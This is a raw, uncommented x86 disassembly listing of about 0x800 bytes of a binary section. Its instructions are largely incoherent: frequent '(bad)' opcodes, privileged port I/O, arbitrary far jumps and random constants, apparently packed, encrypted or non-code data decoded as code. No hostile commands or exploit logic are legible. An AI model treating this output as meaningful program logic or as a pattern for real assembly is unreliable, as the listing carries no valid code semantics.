  4089fe:	mov    cl,BYTE PTR [edx]
  408a00:	inc    edx
  408a01:	pop    esi
  408a02:	scas   al,BYTE PTR es:[edi]
  408a03:	cmp    WORD PTR [ecx],0x56eb
  408a08:	mov    ebp,0x31f4b062
  408a0d:	inc    ebp
  408a0e:	cmc    
  408a0f:	dec    ebx
  408a10:	lds    ebx,FWORD PTR [edx-0x872f16c]
  408a16:	xor    eax,eax
  408a18:	push   0x8eda93b
  408a1d:	mov    ds:0x44785ada,al
  408a22:	std    
  408a23:	in     al,0x71
  408a25:	rcl    BYTE PTR [edx],1
  408a27:	hlt    
  408a28:	in     al,0x7
  408a2a:	mov    cl,0xe8
  408a2c:	sbb    al,0xad
  408a2e:	sbb    dh,BYTE PTR [ebp+0x36426c94]
  408a34:	pusha  
  408a35:	pop    edi
  408a36:	das    
  408a37:	mov    ch,BYTE PTR [edi]
  408a39:	inc    ecx
  408a3a:	jl     0x408a09
  408a3c:	mov    bh,0xfc
  408a3e:	out    0xee,eax
  408a40:	into   
  408a41:	mov    eax,ds:0x8d022ea5
  408a46:	and    ah,0x5f
  408a49:	in     al,dx
  408a4a:	pusha  
  408a4b:	enter  0xb566,0x57
  408a4f:	fs xchg edi,eax
  408a51:	pop    esi
  408a52:	pop    ebx
  408a53:	jmp    0x392:0x2c69e346
  408a5a:	mov    ecx,esi
  408a5c:	ins    BYTE PTR es:[edi],dx
  408a5d:	or     bh,dl
  408a5f:	aas    
  408a60:	pop    DWORD PTR [esi-0xc991abc]
  408a66:	daa    
  408a67:	mov    esi,0x8d75176d
  408a6c:	ds popf 
  408a6e:	stos   DWORD PTR es:[edi],eax
  408a6f:	adc    al,0x9a
  408a71:	xor    eax,0xafa9d82
  408a76:	aas    
  408a77:	mov    ds:0xa297c7b4,eax
  408a7c:	sbb    ebp,ebp
  408a7e:	stos   DWORD PTR es:[edi],eax
  408a7f:	aas    
  408a80:	push   ebp
  408a81:	dec    esp
  408a82:	ins    BYTE PTR es:[edi],dx
  408a83:	adc    al,0x39
  408a85:	loop   0x408afc
  408a87:	pop    edi
  408a88:	popf   
  408a89:	inc    eax
  408a8a:	pop    eax
  408a8b:	xchg   ecx,eax
  408a8c:	fldcw  WORD PTR [eax+ebp*2]
  408a8f:	mov    ds:0x20813f82,al
  408a94:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408a95:	dec    edi
  408a96:	jmp    0x408a3f
  408a98:	mov    al,0x22
  408a9a:	outs   dx,BYTE PTR ds:[esi]
  408a9b:	scas   eax,DWORD PTR es:[edi]
  408a9c:	xchg   DWORD PTR [eax+edx*8],edi
  408a9f:	jns    0x408ad9
  408aa1:	push   cs
  408aa2:	stos   DWORD PTR es:[edi],eax
  408aa3:	jl     0x408a81
  408aa5:	cmp    BYTE PTR [ebp-0x6a4b168],dl
  408aab:	pop    ecx
  408aac:	repz sub eax,DWORD PTR [edi+0x6d]
  408ab0:	imul   esi,DWORD PTR [edx],0x79
  408ab3:	or     DWORD PTR [ecx],0x25344e6a
  408ab9:	aam    0x61
  408abb:	add    al,0xdb
  408abd:	loope  0x408a8d
  408abf:	sti    
  408ac0:	jg     0x408a51
  408ac2:	imul   esi,DWORD PTR [edi+0x5b],0xffffffaa
  408ac6:	jns    0x408b10
  408ac8:	fwait
  408ac9:	inc    eax
  408aca:	mov    ss,WORD PTR [ebp-0x1e]
  408acd:	loopne 0x408b2c
  408acf:	mov    ds:0x81f73971,eax
  408ad4:	cld    
  408ad5:	push   0xf16ff8d7
  408ada:	frstor [edi+0xd]
  408add:	test   ch,cl
  408adf:	icebp  
  408ae0:	jb     0x408b2d
  408ae2:	js     0x408a77
  408ae4:	lods   eax,DWORD PTR ds:[esi]
  408ae5:	out    dx,eax
  408ae6:	stos   DWORD PTR es:[edi],eax
  408ae7:	pusha  
  408ae8:	test   al,0x55
  408aea:	mov    esi,0xf003d307
  408aef:	lods   eax,DWORD PTR ds:[esi]
  408af0:	ds xchg esi,eax
  408af2:	loope  0x408a96
  408af4:	das    
  408af5:	add    eax,0xf5d4fd46
  408afa:	sbb    al,0x87
  408afc:	adc    esp,esi
  408afe:	and    eax,0x5c92cea0
  408b03:	mov    ebp,0x1f94d36e
  408b08:	dec    edx
  408b09:	push   ss
  408b0a:	pop    ecx
  408b0b:	add    eax,0x95cf086c
  408b10:	fcomp  st(4)
  408b12:	fidivr WORD PTR [eax+0x18003836]
  408b18:	cli    
  408b19:	dec    eax
  408b1a:	mov    al,ds:0x6a186bae
  408b1f:	dec    ecx
  408b20:	jg     0x408ace
  408b22:	sbb    BYTE PTR [ecx],bl
  408b24:	outs   dx,BYTE PTR ds:[esi]
  408b25:	scas   al,BYTE PTR es:[edi]
  408b26:	cdq    
  408b27:	inc    esi
  408b28:	rcl    BYTE PTR [ebx],cl
  408b2a:	xchg   ebx,eax
  408b2b:	dec    edx
  408b2c:	repz push ebp
  408b2e:	sbb    DWORD PTR [ecx+0x463caf9d],0xffffffcb
  408b35:	cmp    edx,DWORD PTR [edi]
  408b37:	mov    WORD PTR [edi+0x65edee5b],?
  408b3d:	and    al,0xa9
  408b3f:	div    DWORD PTR [edi]
  408b41:	sar    DWORD PTR [ebx],0x4
  408b44:	xor    al,BYTE PTR [ecx+0x6d]
  408b47:	loopne 0x408b4f
  408b49:	popa   
  408b4a:	pushf  
  408b4b:	fisubr WORD PTR [edx+0x7dccf0a3]
  408b51:	push   eax
  408b52:	adc    al,0xb8
  408b54:	rol    BYTE PTR [esp+ebx*8+0x4c],0x67
  408b59:	arpl   WORD PTR [ecx-0x2d63800b],si
  408b5f:	jae    0x408b89
  408b61:	das    
  408b62:	ror    DWORD PTR [esi-0x5f8d5cc],0x74
  408b69:	fdivr  st,st(2)
  408b6b:	add    al,0x7c
  408b6d:	leave  
  408b6e:	rcl    BYTE PTR [eax],0x1f
  408b71:	sbb    cl,dh
  408b73:	ins    DWORD PTR es:[edi],dx
  408b74:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408b75:	mov    ecx,0x292799fe
  408b7a:	aaa    
  408b7b:	adc    BYTE PTR [edx+0x38],0x66
  408b7f:	bound  ebx,QWORD PTR [ebx+ebp*4]
  408b82:	xchg   ecx,eax
  408b83:	out    dx,eax
  408b84:	cmp    ebx,DWORD PTR [ecx]
  408b86:	mov    bh,0x1f
  408b88:	shl    edx,1
  408b8a:	or     al,0x86
  408b8c:	adc    dl,dl
  408b8e:	or     al,0x87
  408b90:	and    BYTE PTR ds:0xd1e95ed2,dl
  408b96:	sub    cl,BYTE PTR [ebx]
  408b98:	(bad)  
  408b99:	cli    
  408b9a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408b9b:	dec    eax
  408b9c:	push   edi
  408b9d:	jmp    0xc4d1:0xe77e6802
  408ba4:	or     BYTE PTR gs:0xc71a3d82,0x1c
  408bac:	add    DWORD PTR [ebp-0x7d],esp
  408baf:	or     esi,edi
  408bb1:	mov    edx,0xbe69be67
  408bb6:	add    al,0x2b
  408bb8:	pop    ecx
  408bb9:	icebp  
  408bba:	js     0x408be1
  408bbc:	adc    eax,0x344b701
  408bc1:	jmp    0x408bef
  408bc3:	jns    0x408bc5
  408bc5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408bc6:	cdq    
  408bc7:	sbb    BYTE PTR [ecx+0x6f],0x4d
  408bcb:	sahf   
  408bcc:	pop    ecx
  408bcd:	loop   0x408b53
  408bcf:	stos   DWORD PTR es:[edi],eax
  408bd0:	mov    cl,0xb4
  408bd2:	in     al,dx
  408bd3:	sub    BYTE PTR [esi-0x2a],bh
  408bd6:	cmp    al,0x41
  408bd8:	cmp    DWORD PTR [edi+0x67],ebp
  408bdb:	and    esi,0x34b9e87f
  408be1:	push   ss
  408be2:	in     eax,dx
  408be3:	dec    edx
  408be4:	stos   DWORD PTR es:[edi],eax
  408be5:	mov    ?,WORD PTR [ebx+ebp*2+0x5e13476c]
  408bec:	call   DWORD PTR [ebx+0x397f347]
  408bf2:	jae    0x408b8c
  408bf4:	push   eax
  408bf5:	cmp    eax,0x74bfaaa2
  408bfa:	mov    dh,0x39
  408bfd:	retf   0xc559
  408c00:	pop    ds
  408c01:	popf   
  408c02:	mov    dh,0x41
  408c04:	sbb    eax,0x23f2e830
  408c09:	cmp    BYTE PTR [edi+0x63],ch
  408c0c:	cmp    edi,edi
  408c0e:	mov    WORD PTR [ecx-0x302e7357],gs
  408c14:	scas   al,BYTE PTR es:[edi]
  408c15:	mov    eax,0x76eb331f
  408c1a:	dec    ecx
  408c1b:	lock mov bl,0xe2
  408c1e:	xchg   esp,eax
  408c1f:	out    0xc3,al
  408c21:	out    0x19,eax
  408c23:	inc    esp
  408c24:	or     al,0xb0
  408c26:	in     eax,dx
  408c27:	aas    
  408c28:	mov    BYTE PTR [eax],cl
  408c2a:	ds lahf 
  408c2c:	fbstp  TBYTE PTR [ebp+eiz*4-0x57]
  408c30:	repnz (bad) 
  408c32:	imul   ebx,edi,0xffffffbc
  408c35:	stos   DWORD PTR es:[edi],eax
  408c36:	rol    DWORD PTR [edx],cl
  408c38:	mov    ecx,0x1376118d
  408c3d:	xchg   edi,eax
  408c3e:	sbb    eax,DWORD PTR ss:[esi+0x458ba2dc]
  408c45:	loopne 0x408bd2
  408c47:	push   ebp
  408c48:	clc    
  408c49:	mov    edi,DWORD PTR [ebp-0x24]
  408c4c:	xor    edx,ecx
  408c4e:	jmp    0x408fc4
  408c53:	inc    esp
  408c54:	pusha  
  408c55:	sub    BYTE PTR [esi],bh
  408c57:	sub    BYTE PTR [esi+0x72],dl
  408c5a:	(bad)
  408c5f:	push   cs
  408c60:	mov    dh,0x1
  408c62:	mov    cl,0x6c
  408c64:	in     al,0x7c
  408c66:	jl     0x408c3f
  408c68:	jns    0x408ce6
  408c6a:	jl     0x408c30
  408c6c:	test   BYTE PTR [edx+ebp*2-0x362b1dfa],bh
  408c73:	je     0x408c18
  408c75:	in     al,dx
  408c76:	xchg   cl,dh
  408c78:	ror    ebx,cl
  408c7a:	jl     0x408c08
  408c7c:	cmp    DWORD PTR [edx-0x5],edx
  408c7f:	lock in al,0xde
  408c82:	call   0x8fd4:0xdda43c70
  408c89:	hlt    
  408c8a:	or     al,0x7a
  408c8c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408c8d:	jns    0x408c83
  408c8f:	mov    ah,0x1d
  408c91:	imul   eax,ecx,0x16a127af
  408c97:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408c98:	neg    ecx
  408c9a:	push   ds
  408c9b:	stos   BYTE PTR es:[edi],al
  408c9c:	mov    bh,0x72
  408c9e:	and    DWORD PTR [esi+edx*1],esp
  408ca1:	inc    ebx
  408ca2:	add    DWORD PTR [ecx],esi
  408ca4:	nop
  408ca5:	retf   
  408ca6:	in     al,dx
  408ca7:	cld    
  408ca8:	sub    al,0x22
  408caa:	sbb    eax,0x1125841d
  408caf:	inc    esp
  408cb0:	xchg   ecx,eax
  408cb1:	jmp    0x75ae13b8
  408cb6:	retf   
  408cb7:	enter  0x10e8,0xb7
  408cbb:	nop
  408cbc:	push   esp
  408cbd:	(bad)  
  408cbe:	in     eax,0xac
  408cc0:	jo     0x408d13
  408cc2:	xor    DWORD PTR [edx],ebx
  408cc4:	adc    esp,ebp
  408cc6:	pop    ebp
  408cc7:	sub    al,0x30
  408cc9:	ret    
  408cca:	test   bh,ch
  408ccc:	sub    ebx,DWORD PTR [edi-0x22]
  408ccf:	or     eax,0xcfc084e
  408cd4:	in     eax,dx
  408cd5:	rcl    DWORD PTR [esi-0x3f],0xb5
  408cd9:	push   ss
  408cda:	dec    eax
  408cdb:	imul   ebp,DWORD PTR [edi-0x15],0xa497c064
  408ce2:	push   si
  408ce4:	xchg   ebx,eax
  408ce5:	push   edi
  408ce6:	fidivr DWORD PTR [edi+esi*1+0x7c7e6650]
  408ced:	lahf   
  408cee:	mov    dl,dl
  408cf0:	out    0x76,al
  408cf2:	mov    dl,0x60
  408cf4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408cf5:	mov    ebp,0x151b2b05
  408cfa:	mov    ch,0x4e
  408cfc:	shr    DWORD PTR [ebx-0x31],cl
  408cff:	in     al,dx
  408d00:	loop   0x408d0c
  408d02:	(bad)  
  408d03:	push   cs
  408d04:	fstp   DWORD PTR [eax+esi*4]
  408d07:	xor    esi,ebx
  408d09:	sbb    edi,esi
  408d0b:	rol    DWORD PTR [edi],cl
  408d0d:	sub    ch,ch
  408d0f:	dec    ebp
  408d10:	jae    0x408cc4
  408d12:	inc    ebx
  408d13:	addr16 loopne 0x408cbc
  408d16:	push   esp
  408d17:	xor    bh,cl
  408d19:	call   0x68cff949
  408d1e:	sub    edx,DWORD PTR [ebp-0x7a]
  408d21:	mov    ebp,DWORD PTR [edi+0x36b42a21]
  408d27:	in     al,dx
  408d28:	ja     0x408d4c
  408d2a:	jl     0x408cee
  408d2c:	aas    
  408d2d:	jno    0x408d78
  408d2f:	(bad)  
  408d30:	push   ss
  408d31:	add    al,0x96
  408d33:	mov    gs,edi
  408d35:	lds    edi,FWORD PTR [esi+0x4dd09406]
  408d3b:	cwde   
  408d3c:	imul   edi,DWORD PTR [edx-0x79],0x862b32ab
  408d43:	stos   DWORD PTR es:[edi],eax
  408d44:	xchg   esi,eax
  408d45:	cmp    al,0xa9
  408d47:	jge    0x408d79
  408d49:	test   DWORD PTR [ecx-0x48888ac5],esi
  408d4f:	jp     0x408d6b
  408d51:	cmc    
  408d52:	loope  0x408cf7
  408d54:	add    esi,DWORD PTR [esp+ebx*1+0x14a83305]
  408d5b:	fnstenv [ebx-0x1b]
  408d5e:	cmp    BYTE PTR [esi],bh
  408d60:	into   
  408d61:	adc    DWORD PTR [ebx],edx
  408d63:	scas   al,BYTE PTR es:[edi]
  408d64:	rcl    esi,cl
  408d66:	jmp    DWORD PTR [edx+0x70]
  408d69:	lahf   
  408d6a:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  408d6c:	xor    al,0x2c
  408d6e:	mov    ah,0xb3
  408d70:	cdq    
  408d71:	inc    edx
  408d72:	psrlw  mm0,QWORD PTR [ebx]
  408d75:	retf   0x70aa
  408d78:	sub    ebp,edi
  408d7a:	or     ebp,DWORD PTR [eax+0x4b6e3ba1]
  408d80:	fs lock cmp eax,0xed298322
  408d87:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408d88:	les    edx,FWORD PTR [eax]
  408d8a:	mov    edx,0x4b96bd96
  408d8f:	neg    BYTE PTR [ebp-0x5d3df60f]
  408d95:	or     eax,0x17d6da50
  408d9a:	mov    WORD PTR [esi],ss
  408d9c:	out    0x9f,al
  408d9e:	shr    ecx,0xcc
  408da1:	push   ss
  408da2:	retf   0x35ff
  408da5:	es inc esp
  408da7:	pop    eax
  408da8:	sbb    DWORD PTR [edx],ebp
  408daa:	addr16 xchg edx,eax
  408dac:	sbb    esi,DWORD PTR [edx]
  408dae:	push   edx
  408daf:	out    dx,eax
  408db0:	loopne 0x408dda
  408db2:	xor    al,BYTE PTR [eax]
  408db4:	jne    0x408d6f
  408db6:	scas   eax,DWORD PTR es:[edi]
  408db7:	mov    eax,0xdb761bb9
  408dbc:	stos   DWORD PTR es:[edi],eax
  408dbd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408dbe:	in     eax,dx
  408dbf:	mov    dl,0x77
  408dc1:	push   ss
  408dc2:	mov    bh,0x6f
  408dc4:	cmp    eax,0x6af94874
  408dc9:	cmp    eax,0xecefbd7f
  408dce:	sbb    esp,DWORD PTR [eax-0x14e39272]
  408dd4:	and    al,0xe5
  408dd6:	sbb    eax,0x599832
  408ddb:	pusha  
  408ddc:	addr16 dec ebp
  408dde:	jno    0x408de2
  408de0:	(bad)  
  408de1:	adc    eax,0x6a444030
  408de6:	inc    ebp
  408de7:	ficomp DWORD PTR [ecx]
  408de9:	ds lahf 
  408deb:	mov    esp,0x4271580a
  408df0:	pop    ecx
  408df1:	sub    eax,0xacae7323
  408df6:	and    DWORD PTR ds:0x17241adf,esi
  408dfc:	retw   
  408dfe:	out    0x97,al
  408e00:	dec    esi
  408e01:	ror    DWORD PTR [eax-0x5621c348],0x2b
  408e08:	adc    DWORD PTR [edx],0x34baea57
  408e0e:	sbb    al,BYTE PTR [ecx]
  408e10:	iret   
  408e11:	sub    al,ah
  408e13:	xor    eax,0xf0f6a9ef
  408e18:	mov    cl,0x24
  408e1a:	test   al,0xad
  408e1c:	inc    ebx
  408e1d:	jg     0x408e71
  408e1f:	mov    ch,0x6a
  408e21:	out    dx,al
  408e22:	aam    0xc6
  408e24:	xchg   ebx,eax
  408e25:	xchg   edi,eax
  408e26:	rcr    DWORD PTR [ebp+edi*8+0x32],1
  408e2a:	pop    edi
  408e2b:	jge    0x408dcd
  408e2d:	cmp    al,0xe4
  408e2f:	mov    esi,0x423d6198
  408e34:	adc    dh,BYTE PTR ds:0x71adacbd
  408e3a:	pop    ebp
  408e3b:	push   esp
  408e3c:	push   esi
  408e3d:	adc    eax,0x3d299795
  408e42:	rol    dl,1
  408e44:	xchg   esi,eax
  408e45:	jbe    0x408de6
  408e47:	inc    ebx
  408e48:	enter  0x5bed,0x7b
  408e4c:	jmp    0xd26b:0xe1f7b99b
  408e53:	js     0x408e87
  408e55:	pop    edx
  408e56:	add    BYTE PTR [ebp-0x18],cl
  408e59:	std    
  408e5a:	add    DWORD PTR [edx+ecx*4+0x49],esi
  408e5e:	outs   dx,BYTE PTR ds:[esi]
  408e5f:	imul   esi,DWORD PTR [edx+ebx*4],0x30b0d7d0
  408e66:	and    ebp,edx
  408e68:	ss push ebp
  408e6a:	out    0xa9,eax
  408e6c:	dec    edi
  408e6d:	mov    WORD PTR [ecx],gs
  408e6f:	mov    fs,edx
  408e71:	pop    ds
  408e72:	xor    eax,0x32105592
  408e77:	stos   BYTE PTR es:[edi],al
  408e78:	sub    DWORD PTR [ecx+0x24],esp
  408e7b:	or     BYTE PTR [ebx-0x72],al
  408e7e:	arpl   cx,bp
  408e80:	mov    al,ds:0xb07729b2
  408e85:	mov    esp,es
  408e87:	mov    ds:0x5e3f00d8,eax
  408e8c:	mov    ebp,0xff892808
  408e91:	js     0x408ef4
  408e93:	push   DWORD PTR [eax]
  408e95:	leave  
  408e96:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408e97:	mov    bl,0x44
  408e99:	jne    0x408eb0
  408e9b:	repz inc edi
  408e9d:	ror    eax,1
  408e9f:	rol    DWORD PTR [edi],1
  408ea1:	les    esp,FWORD PTR [ecx+0x29dda82c]
  408ea7:	sbb    DWORD PTR [edi],ebp
  408ea9:	mov    ah,0x3f
  408eab:	pop    ss
  408eac:	inc    ecx
  408ead:	inc    edi
  408eae:	mov    bh,0xef
  408eb0:	or     ebp,DWORD PTR [ebx+0x14]
  408eb3:	mov    ecx,0x56621909
  408eb8:	and    eax,0x4fac712f
  408ebd:	cmp    DWORD PTR [esi-0x77f6faa8],ebx
  408ec3:	scas   al,BYTE PTR es:[edi]
  408ec4:	sbb    cl,ch
  408ec6:	sub    eax,DWORD PTR [ebp-0x48848717]
  408ecc:	lods   al,BYTE PTR ds:[esi]
  408ecd:	jns    0x408ede
  408ecf:	pop    edi
  408ed0:	out    dx,eax
  408ed1:	shl    BYTE PTR [edx+0xe002a37],cl
  408ed7:	mov    edi,0xa1889c36
  408edc:	jecxz  0x408e87
  408ede:	mov    dl,0xe3
  408ee0:	leave  
  408ee1:	jmp    0x4363df0e
  408ee6:	xchg   ecx,eax
  408ee7:	mov    ecx,0x82532a87
  408eec:	xchg   BYTE PTR [edi-0x2cb05845],dh
  408ef2:	fsub   QWORD PTR [esi+esi*1-0x5afb738c]
  408ef9:	(bad)  
  408efa:	scas   eax,DWORD PTR es:[edi]
  408efb:	je     0x408f21
  408efd:	fidivr DWORD PTR [ecx-0x3a8dfef6]
  408f03:	add    bl,BYTE PTR [ebp+0x2e]
  408f06:	jge    0x408e89
  408f08:	push   ds
  408f09:	aam    0x3d
  408f0b:	test   BYTE PTR [ebp+0x35],dl
  408f0e:	out    dx,eax
  408f0f:	retf   
  408f10:	xchg   BYTE PTR [edi+0x769ab41],ah
  408f16:	jl     0x408f13
  408f18:	dec    edi
  408f19:	stc    
  408f1a:	inc    eax
  408f1b:	stc    
  408f1c:	xchg   ecx,eax
  408f1d:	jo     0x408edb
  408f1f:	call   0x157b:0x9467221
  408f26:	mov    esp,0x36500d7
  408f2b:	sahf   
  408f2c:	cld    
  408f2d:	jecxz  0x408eba
  408f2f:	pop    eax
  408f30:	mov    bh,0xcc
  408f32:	sub    al,0x9c
  408f34:	cmp    eax,0xce670b0
  408f39:	int3   
  408f3a:	jp     0x408f3e
  408f3c:	pop    edx
  408f3d:	les    edx,FWORD PTR [ebx+esi*4-0x6332060b]
  408f44:	dec    esi
  408f45:	shl    BYTE PTR [edx+0x3b8edbdc],cl
  408f4b:	dec    ax
  408f4d:	xor    dh,BYTE PTR [esi+ecx*4+0x65]
  408f51:	or     eax,0xfecf636
  408f56:	mov    edx,eax
  408f58:	adc    DWORD PTR [edx+eiz*8],esi
  408f5b:	in     eax,dx
  408f5c:	stos   DWORD PTR es:[edi],eax
  408f5d:	jnp    0x408f6c
  408f5f:	mov    es,WORD PTR [esi+0x45c24628]
  408f65:	fwait
  408f66:	and    ebx,edx
  408f68:	inc    edx
  408f69:	imul   esi,DWORD PTR [edi-0x77],0xfffffff2
  408f6d:	ficomp DWORD PTR [ecx+0x30b08201]
  408f73:	mov    bh,0x6b
  408f75:	cmp    DWORD PTR [edi],0xfffffff2
  408f78:	mov    dh,0x4c
  408f7a:	or     ecx,DWORD PTR [esi+0x50]
  408f7d:	(bad)  
  408f7f:	jge    0x408fc6
  408f81:	and    DWORD PTR [eax+0x2a],eax
  408f84:	mov    eax,0xa9fb990c
  408f89:	sar    WORD PTR [edx+0x63cb8712],cl
  408f90:	lds    esp,FWORD PTR [ebp-0x24]
  408f93:	cli    
  408f94:	(bad)
  408f97:	xor    DWORD PTR [eax+ebp*8-0x6aa668f7],edx
  408f9e:	pop    ebx
  408f9f:	stos   DWORD PTR es:[edi],eax
  408fa0:	mov    al,ds:0x552361eb
  408fa5:	cmc    
  408fa6:	and    ch,BYTE PTR ds:0x3df733e5
  408fac:	sbb    eax,0xfb02bb72
  408fb1:	test   eax,0x7615fabb
  408fb6:	mov    esp,0xe6f1c849
  408fbb:	les    ebp,FWORD PTR [ecx]
  408fbd:	or     al,0xc6
  408fbf:	sbb    bh,ah
  408fc1:	or     DWORD PTR [edx-0x1a],0xaf0fd603
  408fc8:	xlat   BYTE PTR ds:[ebx]
  408fc9:	sub    DWORD PTR [eax],edx
  408fcb:	jmp    0x409341
  408fd0:	or     eax,0x738240b6
  408fd5:	jb     0x408fa4
  408fd7:	mov    cl,0xfd
  408fd9:	push   eax
  408fda:	sbb    DWORD PTR [ebx+ecx*1-0x5c],ebp
  408fde:	cld    
  408fdf:	jb     0x408fa8
  408fe1:	loopne 0x40905f
  408fe3:	jl     0x408fbc
  408fe5:	jns    0x409063
  408fe7:	jl     0x409029
  408fe9:	test   DWORD PTR [ebx+0x1c2b9491],edx
  408fef:	mov    al,al
  408ff1:	bound  edi,QWORD PTR [edi+0x9a9174b]
  408ff7:	push   es
  408ff8:	shr    BYTE PTR [ebx],0xf6
  408ffb:	pop    ecx
  408ffc:	arpl   WORD PTR [ebp*2+0x3a1a55e9],bp
  409003:	inc    edx
  409004:	sbb    ecx,edi
  409006:	cmp    DWORD PTR [edi],0x74bfd9e9
  40900c:	shl    dh,cl
  40900e:	cmp    DWORD PTR [ebx-0x5e],0x21
  409012:	xchg   edi,eax
  409013:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409014:	loopne 0x40907e
  409016:	xchg   BYTE PTR [edx],bl
  409018:	push   es
  409019:	mov    cl,0x40
  40901b:	cmp    eax,0xfdb4ee22
  409020:	or     DWORD PTR [edx+0x338e742a],esp
  409026:	sbb    al,0x5e
  409028:	in     al,0x8f
  40902a:	and    bl,bl
  40902c:	jns    0x40901a
  40902e:	add    ebp,esp
  409030:	cmp    dl,ch
  409032:	mov    dh,0x47
  409034:	daa    
  409035:	mov    edi,0x454e2603
  40903a:	cmp    al,0x2c
  40903c:	sar    BYTE PTR [edi+0x25],0xe7
  409040:	mov    ds:0xe103c49c,al
  409045:	sub    ah,0x2a
  409048:	cli    
  409049:	xchg   edx,eax
  40904a:	shl    DWORD PTR [ebx-0x3634566c],cl
  409050:	pop    edx
  409051:	push   es
  409052:	push   esi
  409053:	mov    dh,0xde
  409055:	aad    0x48
  409057:	xchg   esp,eax
  409058:	into   
  409059:	pop    esi
  40905a:	mov    edx,0xadbdcfa3
  40905f:	jecxz  0x409044
  409061:	push   eax
  409062:	push   ss
  409063:	stos   BYTE PTR es:[edi],al
  409064:	dec    ebx
  409065:	adc    BYTE PTR [ebx-0x104391af],dh
  40906b:	call   0xeaf2a808
  409070:	addr16 push cs
  409072:	gs push es
  409074:	and    BYTE PTR [esi-0x5c2027df],0xd5
  40907b:	xor    BYTE PTR [ebx+0x4a],al
  40907e:	pop    edi
  40907f:	push   ecx
  409080:	xchg   edx,eax
  409081:	push   0x2b
  409083:	inc    esp
  409084:	fmul   DWORD PTR [edi]
  409086:	ins    DWORD PTR es:[edi],dx
  409087:	ror    DWORD PTR [ecx+0x55],0x50
  40908b:	mov    edi,es
  40908d:	and    BYTE PTR ds:0x3a74c83a,0xe5
  409094:	push   esp
  409095:	push   ds
  409096:	ret    
  409097:	mov    eax,0x8601c98f
  40909c:	push   eax
  40909d:	xor    al,0x2a
  40909f:	dec    esp
  4090a0:	lock cmc 
  4090a2:	ss js  0x4090eb
  4090a5:	out    dx,eax
  4090a6:	push   edi
  4090a7:	mov    esi,DWORD PTR [ecx*8-0x7ad65cee]
  4090ae:	cmp    eax,DWORD PTR [esi+0x40]
  4090b1:	jmp    0x16aa9c6e
  4090b6:	dec    esi
  4090b7:	in     al,0xd8
  4090b9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4090ba:	adc    DWORD PTR [ebx],ebx
  4090bc:	dec    ecx
  4090bd:	inc    ecx
  4090be:	dec    edi
  4090bf:	pop    ds
  4090c0:	daa    
  4090c1:	mov    eax,ds:0x17be0e00
  4090c6:	into   
  4090c7:	xchg   edx,eax
  4090c8:	out    0x3e,eax
  4090ca:	int3   
  4090cb:	push   cs
  4090cc:	(bad)  
  4090cd:	xchg   esp,eax
  4090ce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4090cf:	pop    esi
  4090d0:	icebp  
  4090d1:	pushf  
  4090d2:	xchg   DWORD PTR [ebp+0x6be731ed],ebx
  4090d8:	cli    
  4090d9:	cwde   
  4090da:	outs   dx,DWORD PTR ds:[esi]
  4090db:	(bad)  
  4090dc:	nop
  4090dd:	or     al,0x5c
  4090df:	jnp    0x409093
  4090e1:	aam    0x19
  4090e3:	retf   
  4090e4:	ins    DWORD PTR es:[edi],dx
  4090e5:	test   BYTE PTR [ecx-0x54],dh
  4090e8:	dec    cl
  4090ea:	adc    eax,0xd98cd55c
  4090ef:	(bad)  
  4090f0:	stc    
  4090f1:	push   ebp
  4090f2:	(bad)  
  4090f3:	and    al,0x45
  4090f5:	adc    cl,ah
  4090f7:	daa    
  4090f8:	retf   
  4090f9:	(bad)  
  4090fa:	aam    0x92
  4090fc:	sub    DWORD PTR [eax],0xc
  4090ff:	mov    ah,0xc7
  409101:	imul   ecx,eax,0x1c61779f
  409107:	clc    
  409108:	arpl   WORD PTR [edx-0x4d],cx
  40910b:	out    0x63,al
  40910d:	push   ecx
  40910e:	loope  0x409098
  409110:	test   al,0xf0
  409112:	jle    0x409130
  409114:	test   DWORD PTR [edi],ebp
  409116:	shl    DWORD PTR [edx],cl
  409118:	or     BYTE PTR [ebx],cl
  40911a:	add    BYTE PTR [esi-0x7],ch
  40911d:	(bad)  
  40911e:	lods   al,BYTE PTR ds:[esi]
  40911f:	nop
  409120:	addr16 mov al,ds:0x7f68
  409124:	int    0x3c
  409126:	not    BYTE PTR [esi]
  409128:	inc    ecx
  409129:	popf   
  40912a:	cmp    dl,BYTE PTR [edi]
  40912c:	ja     0x409180
  40912e:	and    cl,BYTE PTR [ebp-0x61]
  409131:	in     al,dx
  409132:	shr    DWORD PTR [edx],0x16
  409135:	and    bl,dh
  409137:	mov    eax,0x35cc8c30
  40913c:	jnp    0x40914e
  40913e:	sub    eax,0xc78d4e10
  409143:	mov    esi,0x582057f7
  409148:	pop    esi
  409149:	das    
  40914a:	inc    esp
  40914b:	xlat   BYTE PTR ds:[ebx]
  40914c:	div    WORD PTR [ebp+0x63da17e6]
  409153:	daa    
  409154:	sbb    edi,0x53ca347e
  40915a:	cdq    
  40915b:	and    al,0x7f
  40915d:	call   0x835e168c
  409162:	gs loop 0x409142
  409165:	push   eax
  409166:	pop    ds
  409167:	ret    0xc8db
  40916a:	xor    cl,BYTE PTR [eax]
  40916c:	xor    ch,BYTE PTR [ecx]
  40916e:	push   ecx
  40916f:	test   al,0x89
  409171:	pop    ebx
  409172:	mov    ds:0xe0431815,eax
  409177:	fcomp  DWORD PTR [eax+0x78]
  40917a:	dec    esp
  40917b:	sar    BYTE PTR [ecx],cl
  40917d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40917e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40917f:	push   ebp
  409180:	or     dl,BYTE PTR [edx]
  409182:	mov    bh,0xfa
  409184:	jl     0x4091ff
  409186:	nop
  409187:	fnstenv [esi+0x3056c1c3]
  40918d:	adc    esi,esi
